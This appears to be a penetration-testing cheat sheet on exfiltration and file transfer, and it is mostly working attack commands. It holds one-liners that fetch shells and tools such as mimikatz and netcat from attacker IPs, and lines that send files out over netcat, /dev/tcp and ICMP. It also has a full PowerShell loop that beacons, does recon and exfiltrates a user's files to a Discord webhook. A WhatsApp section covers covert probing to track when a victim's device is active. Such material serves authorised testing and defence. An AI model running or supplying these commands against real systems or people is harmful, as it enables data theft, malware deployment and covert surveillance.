# Exfiltration

{{#include ../banners/hacktricks-training.md}}

## Commonly whitelisted domains to exfiltrate information

Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused

## Copy\&Paste Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Upload files

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python module [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS Server**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration

Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.

Key ideas:
- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Notes:
- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Reverse-engineered Messaging APIs (WhatsApp multi-device mapping)

Reverse-engineered clients such as [whatsmap](https://github.com/Cfomodz/whatsmap) embed the `whatsmeow` Go library to act as a first-class WhatsApp Web multi-device endpoint. Once paired, operators can collect messages, decrypt attachments, and even infer device usage patterns without ever opening the official client.

### Pair headless clients securely
1. Build and link the automation client locally:

```bash
git clone https://github.com/Cfomodz/whatsmap.git
cd whatsmap
go build ./cmd/wamapper
./wamapper -mode qr -db mapper.db
```

2. The QR code pairing flow provisions identity keys inside `mapper.db`. Anyone copying that SQLite file (or the `store/` directory if you use multiple devices) can replay the session and fully drive the bound WhatsApp account, so keep it on encrypted storage and never expose it through file shares.
3. Runtime telemetry, RTT measurements, and derived patterns are persisted separately in `rtt_data.db`; stealing it leaks contact metadata, targeting history, and previously inferred states.

### Stream and normalize traffic
The `whatsmeow.Client` can register event handlers that translate raw protobufs into JSON structures that are easy to forward to HTTP endpoints, message queues, or SIEMs:

```go
cli.AddEventHandler(func(evt interface{}) {
    if msg, ok := evt.(*events.Message); ok {
        record := map[string]any{"from": msg.Info.Sender.String(), "to": msg.Info.Chat.String(), "id": msg.Info.ID, "ts": msg.Info.Timestamp.Unix(), "body": msg.Message.GetConversation()}
        json.NewEncoder(pipe).Encode(record)
    }
})
```

Because the client maintains the same websocket/TLS session as the browser version, this pattern reliably captures group membership changes, reactions, and history syncs that happen while your automation stack is offline.

### Decrypting WhatsApp media artifacts
`download-to-file.go` implements the full WhatsApp media key derivation and integrity checking logic, letting you persist encrypted media without reverse engineering the protobuf every time:

1. Pull the media URL, `mediaKey`, HMAC, and size from the incoming message (e.g., `msg.Message.GetImageMessage()`).
2. Call `GetMediaType` to resolve the correct “info key” and derive IV/cipher/MAC keys via WhatsApp’s HKDF.
3. `downloadAndDecryptToFile` streams the HTTPS object, strips the trailing MAC, validates `fileEncSHA256`, and AES-CBC decrypts the payload in-place.
4. The helper automatically re-seeks the file, verifies the cleartext SHA256, and truncates it to the expected length so you can safely hand the descriptor to downstream tooling.
5. For offline loot, open an `*os.File`, call `client.DownloadToFile(ctx, imageMsg, f)`, and the helper will resume partial downloads and retry failed hosts.

### RTT-based device-state recon
`wamapper` weaponizes silent reaction probes to map when a victim’s device is awake. In `probe` mode the client sends a reaction to a non-existent message ID, waits for the delivery receipt, and stores the round-trip time:

```bash
./wamapper -mode probe -target 14155551234 -duration 24h -interval 30s -probe-type reaction
./wamapper -mode export -target 14155551234 -export-csv data.csv
python analysis/visualize.py data.csv -o report.png
```

Typical RTT interpretations (from the Careless Whisper paper) are:

| RTT range | Inference | Notes |
| --- | --- | --- |
| <300 ms | App foreground | WhatsApp chat view is open, high-fidelity beaconing |
| 300–1000 ms | Screen on | Screen is unlocked, app may be backgrounded |
| 1000–3000 ms | Screen off | Device locked but responsive |
| >3000 ms or timeout | Doze/offline | Power saving or no data coverage |

Switching `-probe-type` to `presence` subscribes to native presence nodes, but the fake-reaction method is stealthier because it never alerts the target.

### OPSEC
- Bind `wamapper`’s API/export endpoints to localhost and forward them through SSH if remote operators need access.
- Treat `mapper.db` and `rtt_data.db` as high-value credentials; rotate them if a host is compromised.
- Because the Go client auto-reconnects, always stop it cleanly before copying databases or you can corrupt the WAL files.

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP server (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP server (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** client

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali as server

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Or create a smb share **using samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

## SCP

The attacker has to have SSHd running.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

If the victim has SSH, the attacker can mount a directory from the victim to the attacker.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Download file from victim

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Upload file to victim

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

thanks to **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## **SMTP**

If you can send data to an SMTP server, you can create an SMTP to receive the data with python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

## TFTP

By default in XP and 2003 (in others it needs to be explicitly added during installation)

In Kali, **start TFTP server**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**TFTP server in python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

In **victim**, connect to the Kali server:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Download a file with a PHP oneliner:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Victim**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Then copy-paste the text into the windows-shell and a file called nc.exe will be created.

- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)

## References

- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
- [whatsmap – WhatsApp Activity Mapper](https://github.com/Cfomodz/whatsmap)
- [Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users on Mobile Instant Messengers](https://arxiv.org/abs/2411.11194)

{{#include ../banners/hacktricks-training.md}}